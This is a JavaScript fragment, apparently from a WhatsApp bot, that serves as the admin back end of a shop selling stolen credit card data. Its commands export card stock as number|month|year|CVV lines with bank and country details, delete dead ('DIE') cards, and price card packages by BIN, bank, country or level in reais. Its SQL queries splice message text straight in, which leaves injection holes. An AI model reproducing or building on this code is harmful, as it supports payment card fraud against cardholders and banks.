        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/baixarestoqueccs") > -1 && Adms.includes(Numero)) {
            if (Mensagem_Texto.indexOf("full") > -1) {
                TIPOCC = "2"
                Texto = `*GERANDO ARQUIVO DE CCS DO ESTOQUE DISPONÍVEL (FULL DADOS)...*

*FORMATO:*
*NUMER|MES|ANO|CVV - BANDEIRA - TIPO - NIVEL - BANCO - PAIS - DADOS(Que você colocou)*`
            } else {
                TIPOCC = "1"
                Texto = `*GERANDO ARQUIVO DE INFO CCS DO ESTOQUE DISPONÍVEL...*

*FORMATO:*
*NUMER|MES|ANO|CVV - BANDEIRA - TIPO - NIVEL - BANCO - PAIS*`
            }

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            Array_CCS = await DataBase_Better.prepare(`SELECT * FROM CCS WHERE TIPOCC = '${TIPOCC}'`).all();
            //shuffle(Array_CCS);

            today = new Date();
            today.setHours(today.getHours() + 0);
            if (Mensagem_Texto.indexOf("full") > -1) {
                Nome_File_Visual = `${Nome_Dono} ${Array_CCS.length} CCs FULL DADOS ${today}.txt`
            } else {
                Nome_File_Visual = `${Nome_Dono} ${Array_CCS.length} INFO CCs ${today}.txt`
            }
            Nome_File_Visual = `${Nome_Dono} ${Array_CCS.length} CCs COM INFOS Data ${today}.txt`
            Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
            Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');
            Nome_File = __dirname + `\\PacotesMIX\\${Nome_File_Visual}`

            //console.log(Nome_File_Visual)
            //console.log(Nome_File)

            message = fs.createWriteStream(Nome_File);
            for (var index = 0; index < Array_CCS.length; index++) {
                console.log(`${Array_CCS[index]["NUMERO"]}|${Array_CCS[index]["MES"]}|${Array_CCS[index]["ANO"]}|${Array_CCS[index]["CVV"]} - ${Array_CCS[index]["BANDEIRA"]} - ${Array_CCS[index]["TIPO"]} - ${Array_CCS[index]["NIVEL"]} - ${Array_CCS[index]["BANCO"]} - ${Array_CCS[index]["PAIS"]} - ${Array_CCS[index]["DADOS"]}\n`)
                message.write(`${Array_CCS[index]["NUMERO"]}|${Array_CCS[index]["MES"]}|${Array_CCS[index]["ANO"]}|${Array_CCS[index]["CVV"]} - ${Array_CCS[index]["BANDEIRA"]} - ${Array_CCS[index]["TIPO"]} - ${Array_CCS[index]["NIVEL"]} - ${Array_CCS[index]["BANCO"]} - ${Array_CCS[index]["PAIS"]} - ${Array_CCS[index]["DADOS"]}\n`);
                if (index === parseInt(Array_CCS.length) - 1) {
                    //console.log("Foi")
                    await delay(3000)
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/deletarestoqueccsdie") > -1 && Adms.includes(Numero)) {

            if (Mensagem_Texto.indexOf("full") > -1) {
                Texto = `*ESTOQUE DE CCs (FULL DADOS) [DIE] DELETADAS COM SUCESSO!*`
                await DataBase_Better.prepare(`DELETE FROM CCS_DIE WHERE TIPOCC = '2'`).run();
            } else {
                Texto = `*ESTOQUE DE INFO CCs [DIE] DELETADAS COM SUCESSO!*`
                await DataBase_Better.prepare(`DELETE FROM CCS_DIE WHERE TIPOCC = '1'`).run();
            }

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/deletarestoqueccs") > -1 && Adms.includes(Numero)) {

            if (Mensagem_Texto.indexOf("full") > -1) {
                Texto = `*ESTOQUE DE CCs (FULL DADOS) [DISPONÍVEIS] DELETADO COM SUCESSO!*`
                await DataBase_Better.prepare(`DELETE FROM CCS WHERE TIPOCC = '2'`).run();
            } else {
                Texto = `*ESTOQUE DE INFO CCs [DISPONÍVEIS] DELETADO COM SUCESSO!*`
                await DataBase_Better.prepare(`DELETE FROM CCS WHERE TIPOCC = '1'`).run();
            }

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto === "/deletarlistapacotescc" && Adms.includes(Numero)) {
            Array_CCS = await DataBase_Better.prepare(`DELETE FROM PACOTES_CC`).run();
            Texto = `Lista de PACOTES CC deletada com sucesso!`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/inserirpacotecc===") > -1 && Adms.includes(Numero)) {
            ///inserirpacotecc===NIVEL===QUANTIDADE===VALOR
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (Array_Total_Igual.length != 9) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            if (msg[1] === "" || msg[2] === "" || msg[3] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            NIVEL = msg[1]
            QUANTIDADE = msg[2]
            VALOR = msg[3]
            VALOR = parseFloat(VALOR).toFixed(2);
            Texto = `*${QUANTIDADE}* CCs *${NIVEL}* por *R$:${VALOR}* inserida na lista de pacotes.`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/deletarpacote") > -1 && Adms.includes(Numero)) {

            if (Mensagem_Texto.indexOf("mix") > -1) {
                COLUNA = "MIX"
            }
            if (Mensagem_Texto.indexOf("nivel") > -1) {
                COLUNA = "NIVEL"
            }
            if (Mensagem_Texto.indexOf("bandeira") > -1) {
                COLUNA = "BANDEIRA"
            }
            if (Mensagem_Texto.indexOf("pais") > -1) {
                COLUNA = "PAIS"
            }
            if (Mensagem_Texto.indexOf("banco") > -1) {
                COLUNA = "BANCO"
            }
            if (Mensagem_Texto.indexOf("bin") > -1) {
                COLUNA = "BIN"
            }
            if (Mensagem_Texto.indexOf("full") > -1) {
                Full = "_FULL"
            } else {
                Full = ""
            }

            await DataBase_Better.prepare(`DELETE FROM Opcoes_Pacote_CCs_${COLUNA}${Full}`).run();
            Texto = `Opções de Pacotes tipo ${COLUNA}${Full} deletadas com sucesso!`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Texto.indexOf("/inserirnopacote") > -1 && Mensagem_Texto.indexOf("===") > -1) && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || msg[2] === "" || Array_Total_Igual.length != 9) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (Mensagem_Texto.indexOf("mix") > -1) {
                COLUNA = "MIX"
            }
            if (Mensagem_Texto.indexOf("nivel") > -1) {
                COLUNA = "NIVEL"
            }
            if (Mensagem_Texto.indexOf("bandeira") > -1) {
                COLUNA = "BANDEIRA"
            }
            if (Mensagem_Texto.indexOf("pais") > -1) {
                COLUNA = "PAIS"
            }
            if (Mensagem_Texto.indexOf("banco") > -1) {
                COLUNA = "BANCO"
            }
            if (Mensagem_Texto.indexOf("bin") > -1) {
                COLUNA = "BIN"
            }
            if (Mensagem_Texto.indexOf("full") > -1) {
                Full = "_FULL"
            } else {
                Full = ""
            }

            PARAMETRO = msg[1]
            QUANTIDADE = msg[2]
            VALOR = msg[3]
            VALOR = parseFloat(VALOR).toFixed(2);

            if (Mensagem_Texto.indexOf("mix") > -1) {
                await DataBase_Better.prepare(`INSERT INTO Opcoes_Pacote_CCs_MIX${Full} (QUANTIDADE,VALOR) VALUES ('${QUANTIDADE}','${VALOR}')`).run()
            } else {
                await DataBase_Better.prepare(`INSERT INTO Opcoes_Pacote_CCs_${COLUNA}${Full} (${COLUNA},QUANTIDADE,VALOR) VALUES ('${PARAMETRO}','${QUANTIDADE}','${VALOR}')`).run()
            }
            Texto = `*${QUANTIDADE}* CCs *${PARAMETRO}* por *R$:${VALOR}* inserida na lista de pacote tipo: ${COLUNA}.`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
